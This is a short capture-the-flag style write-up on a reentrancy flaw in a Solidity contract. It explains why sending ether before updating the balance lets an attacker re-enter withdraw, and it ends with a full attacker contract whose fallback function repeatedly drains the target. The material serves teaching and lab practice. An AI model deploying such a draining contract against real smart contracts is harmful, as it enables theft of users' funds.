### The goal of this level is for you to steal all the funds from the contract.

Reentrancy is one of the most overlooked vulnerability of the past.
It is widely known in the community.
The attacker exploits the weakness of the contract that allows the attacker to `receive eth multiple times` using a single function call by using the `fallback` function in the attacker's contract.

In this case , Here is how the function looks

```solidity
    function withdraw(uint256 _amount) public {
            if (balances[msg.sender] >= _amount) {
                (bool result,) = msg.sender.call{value: _amount}("");
                if (result) {
                    _amount;
                }
                balances[msg.sender] -= _amount;
            }
    }
```

We can see that, if the attackers tries to enter into the function once again using line

```solidity
    (bool result,) = msg.sender.call{value: _amount}("");
```

as we haven't executed line

```solidity
    balances[msg.sender] -= _amount;
```

the function allows the attacker to enter once again, hence allowing the attacker to receive eth multiple times.

Here is how the attacker's contract might look like

```solidity
    contract hackReentrance{
        Reentrance reentrance;
        uint256 AMOUNT = 1 * 10**15;

        constructor(address _reentrance){
            reentrance = Reentrance(_reentrance);
        }

        function withdraw(address receiver) public returns(bool){
            (bool success) = payable(receiver).send(address(this).balance);
            return success;
        }

        function callDonate() public returns(bool){
            (bool success,) = payable(address(reentrance)).call{value:AMOUNT}(abi.encodeWithSignature("donate(address)", address(this)));
            return success;
        }

        function attackReentrance() public{
            reentrance.withdraw(AMOUNT);
        }

        fallback() external payable{
            if(msg.sender == address(reentrance) && address(reentrance).balance >= 0){
                reentrance.withdraw(AMOUNT);
            }
        }
    }
```
